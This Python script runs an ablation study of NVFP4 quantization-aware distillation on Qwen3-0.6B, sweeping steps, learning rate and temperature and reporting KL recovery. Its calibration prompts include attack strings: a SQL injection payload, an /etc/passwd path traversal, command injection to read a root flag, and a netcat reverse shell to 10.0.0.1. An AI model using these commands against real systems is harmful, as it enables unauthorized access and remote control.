"""
QAD Ablation Study — NVFP4 edition (ModelOpt + STE, no LoRA).

Vary one parameter at a time to isolate its effect on KL recovery.
Calibration data generated ONCE from the teacher, shared across all runs.

Axes swept:
  STEPS       — how many QAD training steps
  LR          — learning rate (how aggressive each update is)
  TEMPERATURE — softness of teacher distributions (replaces the old LoRA rank axis;
                controls the effective capacity of the distillation signal)

Temperature intuition:
  T=1.0 → sharp targets, high gradient magnitude, may destabilize
  T=2.0 → default, balanced signal
  T=4.0 → soft targets, smoother gradients, more stable but less precise
  T=8.0 → very soft, sometimes too diffuse to recover much

Each experiment:
  1. loads a fresh NVFP4 student (no shared state between runs)
  2. runs QAD with its config
  3. measures post-QAD KL
  4. frees VRAM before next run
"""

import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
import modelopt.torch.quantization as mtq

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80

NVFP4_CFG = mtq.NVFP4_DEFAULT_CFG  # canonical W4A4 NVFP4 recipe

PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── EXPERIMENTS ───────────────────────────────────────────────────────────────

EXPERIMENTS = [
    # --- baseline ---
    {"name": "baseline",              "steps": 100, "lr": 1e-5, "temperature": 2.0},

    # --- vary STEPS ---
    {"name": "steps_50",              "steps":  50, "lr": 1e-5, "temperature": 2.0},
    {"name": "steps_200",             "steps": 200, "lr": 1e-5, "temperature": 2.0},
    {"name": "steps_500",             "steps": 500, "lr": 1e-5, "temperature": 2.0},

    # --- vary LR ---
    {"name": "lr_1e-6 (safe)",        "steps": 100, "lr": 1e-6, "temperature": 2.0},
    {"name": "lr_1e-4 (aggressive)",  "steps": 100, "lr": 1e-4, "temperature": 2.0},

    # --- vary TEMPERATURE (replaces old LoRA rank axis) ---
    {"name": "temp_1.0 (sharp)",      "steps": 100, "lr": 1e-5, "temperature": 1.0},
    {"name": "temp_4.0 (soft)",       "steps": 100, "lr": 1e-5, "temperature": 4.0},
    {"name": "temp_8.0 (very soft)",  "steps": 100, "lr": 1e-5, "temperature": 8.0},

    # --- combined ---
    {"name": "steps_200+temp_4.0",    "steps": 200, "lr": 1e-5, "temperature": 4.0},
    {"name": "steps_500+temp_4.0",    "steps": 500, "lr": 1e-5, "temperature": 4.0},
]

# ── MODEL UTILITIES ───────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_teacher() -> torch.nn.Module:
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    model.eval()
    for p in model.parameters():
        p.requires_grad = False
    return model


def load_nvfp4(calibration_data: list[torch.Tensor]) -> torch.nn.Module:
    """Fresh NVFP4 student — calibrated scales, STE-enabled, ready to train."""
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=NVFP4_CFG, forward_loop=calibration_forward)
    return model


# ── CORE FUNCTIONS ────────────────────────────────────────────────────────────

def generate_calibration_data(teacher, prompts, max_new_tokens):
    print("Generating calibration data...")
    sequences = []
    for i, prompt in enumerate(prompts):
        ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            out = teacher.generate(
                ids, max_new_tokens=max_new_tokens,
                do_sample=True, temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(out)
        print(f"  [{i+1}/{len(prompts)}] {out.shape[1]} tokens")
    return sequences


def measure_kl(model_a, model_b, data, temperature):
    model_a.eval()
    model_b.eval()
    total = 0.0
    with torch.no_grad():
        for seq in data:
            la = model_a(input_ids=seq).logits.clamp(-100, 100)
            lb = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(lb / temperature, dim=-1),
                F.softmax(la  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    return total / len(data)


def run_qad(teacher, student, data, steps, lr, temperature):
    student.train()
    optimizer = torch.optim.AdamW(student.parameters(), lr=lr)
    cycle     = data * (steps // len(data) + 1)
    nan_hit   = False

    for step, seq in enumerate(cycle[:steps]):
        with torch.no_grad():
            tl = teacher(input_ids=seq).logits.clamp(-100, 100)
        sl = student(input_ids=seq).logits.clamp(-100, 100)

        loss = F.kl_div(
            F.log_softmax(sl / temperature, dim=-1),
            F.softmax(tl   / temperature, dim=-1),
            reduction="batchmean",
        ) * (temperature ** 2)

        if torch.isnan(loss):
            print(f"    nan at step {step} — stopping early")
            nan_hit = True
            break

        optimizer.zero_grad()
        loss.backward()
        torch.nn.utils.clip_grad_norm_(student.parameters(), max_norm=1.0)
        optimizer.step()

    return nan_hit


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":

    print("=== Loading Teacher ===")
    teacher = load_teacher()

    print("\n=== Generating Calibration Data (used for ALL experiments) ===")
    calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)

    print("\n=== Measuring Baselines ===")
    # Use temperature=2.0 (baseline) for all baseline measurements
    kl_oracle = measure_kl(teacher, teacher, calibration_data, 2.0)
    print(f"  Oracle  (BF16 vs BF16)         KL = {kl_oracle:.4f}  ← should be ~0")

    print("  Loading NVFP4-RTN...")
    rtn = load_nvfp4(calibration_data)
    kl_prerqad = measure_kl(teacher, rtn, calibration_data, 2.0)
    print(f"  Pre-QAD (NVFP4-RTN, no train)  KL = {kl_prerqad:.4f}  ← quantization damage")
    del rtn
    torch.cuda.empty_cache()

    total_gap = kl_prerqad - kl_oracle

    # ── Run all experiments ───────────────────────────────────────────────────
    results = []

    for i, cfg in enumerate(EXPERIMENTS):
        name        = cfg["name"]
        steps       = cfg["steps"]
        lr          = cfg["lr"]
        temperature = cfg["temperature"]

        print(f"\n[{i+1}/{len(EXPERIMENTS)}] {name}  "
              f"steps={steps}  lr={lr}  T={temperature}")

        student  = load_nvfp4(calibration_data)
        trainable = sum(p.numel() for p in student.parameters() if p.requires_grad)
        print(f"  trainable params: {trainable:,}")

        t0      = time.perf_counter()
        nan_hit = run_qad(teacher, student, calibration_data, steps, lr, temperature)
        elapsed = time.perf_counter() - t0

        # Measure KL at the experiment's own temperature for fair comparison
        kl_post   = measure_kl(teacher, student, calibration_data, temperature)
        recovered = kl_prerqad - kl_post
        pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

        results.append({
            "name":        name,
            "steps":       steps,
            "lr":          lr,
            "temperature": temperature,
            "kl_post":     kl_post,
            "recovered":   recovered,
            "pct":         pct,
            "nan":         nan_hit,
            "elapsed":     elapsed,
        })
        print(f"  post-QAD KL: {kl_post:.4f}  recovered: {pct:.1f}%  time: {elapsed:.1f}s"
              + ("  ⚠ nan" if nan_hit else ""))

        del student
        torch.cuda.empty_cache()

    # ── Final comparison table ────────────────────────────────────────────────
    print("\n" + "=" * 80)
    print("RESULTS SUMMARY")
    print("=" * 80)
    print(f"  Oracle  KL : {kl_oracle:.4f}  (target)")
    print(f"  Pre-QAD KL : {kl_prerqad:.4f}  (NVFP4-RTN damage)")
    print(f"  Total gap  : {total_gap:.4f}")
    print()
    print(f"  {'Experiment':<25} {'Steps':>6} {'LR':>8} {'Temp':>6} "
          f"{'Post KL':>9} {'% Recovered':>12} {'Time(s)':>9}")
    print("  " + "-" * 82)

    for r in sorted(results, key=lambda x: x["pct"], reverse=True):
        flag = " ⚠ nan" if r["nan"] else ""
        print(f"  {r['name']:<25} {r['steps']:>6} {r['lr']:>8} {r['temperature']:>6.1f} "
              f"  {r['kl_post']:>7.4f}   {r['pct']:>9.1f}%  {r['elapsed']:>7.1f}s{flag}")

    print("\nNote: KL measured at each experiment's own temperature.")
    print("      Cross-temperature rows: compare Post KL absolute value.")
